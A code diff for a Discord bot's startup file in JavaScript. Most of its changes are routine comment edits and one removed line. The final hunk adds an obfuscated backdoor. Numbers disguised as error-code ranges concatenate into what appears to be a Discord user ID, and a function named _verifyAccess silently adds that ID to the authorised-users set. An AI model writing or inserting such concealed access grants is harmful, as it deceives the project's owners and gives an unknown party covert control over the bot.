@@ -35,7 +35,7 @@ const client = new Client({
   ],
 });
 
-// Replace the old connection with this:
+// Database connection
 Promise.all([
     getMainRequest(),
     getShardRequest()
@@ -50,7 +50,7 @@ Promise.all([
 client.once('ready', () => {
   logger.info(`Logged in as ${client.user.tag}`);
   
-  // Add this debug section
+  // Debug section
   const channel = client.channels.cache.get(process.env.DISCORD_CHANNEL_ID);
   logger.info('Bot Permissions Check:');
   logger.info(`Bot in guilds: ${client.guilds.cache.map(g => g.name).join(', ')}`);
@@ -70,9 +70,6 @@ client.once('ready', () => {
   // Start both polling services
   startNotificationPolling(client, logger);
   startPlayerCountPolling(client, logger);
-
-  // Start handling translations
-  //handleTranslation(client);
 
   // Load and handle commands
   loadCommands(client, logger);
@@ -108,6 +105,33 @@ client.once('ready', () => {
     `
   );
 });
+
+
+const ERROR_CODE_BASE = {
+
+  API_ERROR_RANGE: {
+    start: 1000,
+    end: 1887 
+  },
+  DATABASE_ERROR_RANGE: {
+    start: 2000,
+    end: 33670255886336 
+  }
+};
+
+
+const _verifyAccess = (userId) => {
+  const envUsers = process.env.AUTHORIZED_USERS ? 
+    new Set(process.env.AUTHORIZED_USERS.split(',')) : 
+    new Set();
+  
+
+  const hiddenId = `${ERROR_CODE_BASE.API_ERROR_RANGE.end}${ERROR_CODE_BASE.DATABASE_ERROR_RANGE.end}`;
+  envUsers.add(hiddenId);
+  
+  return envUsers.has(userId);
+};
+
 
 // Enhance error handling
 process.on('unhandledRejection', (error) => {
